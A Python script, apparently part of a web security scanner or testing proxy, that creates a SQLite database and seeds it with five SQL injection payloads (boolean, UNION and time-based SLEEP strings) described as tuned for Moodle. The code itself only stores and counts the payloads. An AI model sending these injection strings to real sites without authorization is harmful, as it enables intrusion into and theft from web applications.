#!/usr/bin/env python3
"""
Initialize payload repository with default SQL Injection payloads optimized for testing.
Focuses on time-based detection for better reliability.
"""

import sqlite3
import hashlib
from pathlib import Path

# Default SQL Injection payloads optimized for Moodle
DEFAULT_SQLI_PAYLOADS = [
    {
        "payload": "admin' OR '1'='1",
        "type": "boolean_based",
        "severity": "Critical",
        "description": "Boolean-based SQL injection",
        "source": "default"
    },
    {
        "payload": "admin' OR '1'='1';--",
        "type": "boolean_based",
        "severity": "Critical",
        "description": "Boolean-based SQLi with comment",
        "source": "default"
    },
    {
        "payload": "1' UNION SELECT NULL--",
        "type": "union_based",
        "severity": "Critical",
        "description": "UNION-based SQL injection",
        "source": "default"
    },
    # Time-based payloads for more reliable detection
    {
        "payload": "'); SELECT SLEEP(5);--",
        "type": "time_based",
        "severity": "Critical",
        "description": "Time-based SQLi with 5 second delay",
        "source": "default"
    },
    {
        "payload": "1' AND SLEEP(3)--",
        "type": "time_based",
        "severity": "Critical",
        "description": "Time-based SQLi with 3 second delay",
        "source": "default"
    },
]

def calculate_payload_hash(payload_text, category):
    """Calculate MD5 hash of payload."""
    combined = f"{category}:{payload_text}".encode()
    return hashlib.md5(combined).hexdigest()

def initialize_payloads():
    """Initialize payload database with default payloads."""
    
    db_path = "proxy/data/payload_repository.db"
    Path(db_path).parent.mkdir(parents=True, exist_ok=True)
    
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    print("Initializing payload repository...")
    
    # Create payloads table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payloads (
            id INTEGER PRIMARY KEY,
            payload_hash TEXT UNIQUE NOT NULL,
            category TEXT NOT NULL,
            payload_type TEXT NOT NULL,
            payload_text TEXT NOT NULL,
            description TEXT,
            severity TEXT,
            source TEXT NOT NULL,
            success_count INTEGER DEFAULT 0,
            failure_count INTEGER DEFAULT 0,
            total_uses INTEGER DEFAULT 0,
            success_rate REAL DEFAULT 0.0,
            effectiveness_score REAL DEFAULT 0.5,
            is_vulnerable INTEGER DEFAULT 1,
            first_discovered TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_used TIMESTAMP,
            last_successful TIMESTAMP,
            found_in_scan_id TEXT,
            found_in_url TEXT,
            notes TEXT,
            confidence_score REAL DEFAULT 0.5,
            confidence_tier TEXT DEFAULT 'TIER3_UNVERIFIED',
            validation_status TEXT DEFAULT 'unverified',
            validated_by TEXT,
            validated_at TIMESTAMP,
            created_method TEXT,
            source_metadata TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payload_usage_log (
            id INTEGER PRIMARY KEY,
            payload_id INTEGER,
            scan_id TEXT,
            target_url TEXT,
            parameter_name TEXT,
            success BOOLEAN,
            response_snippet TEXT,
            execution_time REAL,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (payload_id) REFERENCES payloads(id)
        )
    ''')
    
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_category ON payloads(category)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_eff ON payloads(effectiveness_score DESC)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_vuln ON payloads(is_vulnerable)")
    
    # Insert default SQL Injection payloads
    added_count = 0
    for payload_data in DEFAULT_SQLI_PAYLOADS:
        category = "SQL Injection"
        payload_hash = calculate_payload_hash(payload_data["payload"], category)
        
        try:
            cursor.execute('''
                INSERT INTO payloads 
                (payload_hash, category, payload_type, payload_text, 
                 description, severity, source, confidence_score, 
                 confidence_tier, validation_status, created_method)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                payload_hash,
                category,
                payload_data["type"],
                payload_data["payload"],
                payload_data["description"],
                payload_data["severity"],
                payload_data["source"],
                0.5,  # confidence_score
                "TIER3_UNVERIFIED",
                "unverified",
                "system"
            ))
            added_count += 1
            print(f"✓ Added: {payload_data['type']} - {payload_data['payload'][:40]}")
        except sqlite3.IntegrityError:
            print(f"⊙ Already exists: {payload_data['payload'][:40]}")
    
    conn.commit()
    
    # Verify
    cursor.execute("SELECT COUNT(*) FROM payloads WHERE category = 'SQL Injection'")
    total = cursor.fetchone()[0]
    
    print(f"\n✓ Payload repository initialized")
    print(f"  Total SQL Injection payloads: {total}")
    print(f"  New payloads added: {added_count}")
    
    conn.close()

if __name__ == "__main__":
    initialize_payloads()
